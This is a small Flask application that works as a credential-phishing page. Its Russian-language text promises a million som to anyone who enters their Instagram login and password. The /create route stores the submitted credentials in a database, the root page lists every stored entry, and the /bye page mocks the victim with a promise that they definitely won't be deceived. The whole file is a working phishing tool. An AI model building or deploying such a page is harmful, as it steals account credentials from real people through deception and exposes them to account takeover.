
from flask import Flask, render_template, request, redirect
from peewee import * 
from models import Post

app = Flask(__name__)

@app.route('/') 
def mike():
    all_posts = Post.select()
    return render_template("index.html", posts=all_posts)

@app.route('/create', methods = ('GET', 'POST'))
def create():
    if request.method == 'POST':
        login = request.form['login']
        password = request.form['password']

        Post.create(
            login = login,
            password = password
        )
        return redirect('/bye')
    return f'<h1>Если хочешь выиграть миллион сом, то просто введи пароль и логин от инстаграм 🥰</h1>\n {render_template("create.html")}'

@app.route('/bye')
def ex():
    return '<h1>Мы вас точно не обманем🤣 и в скором времени переведем деньги))</h1>'

if __name__ == "__main__":
    app.run(debug=True)
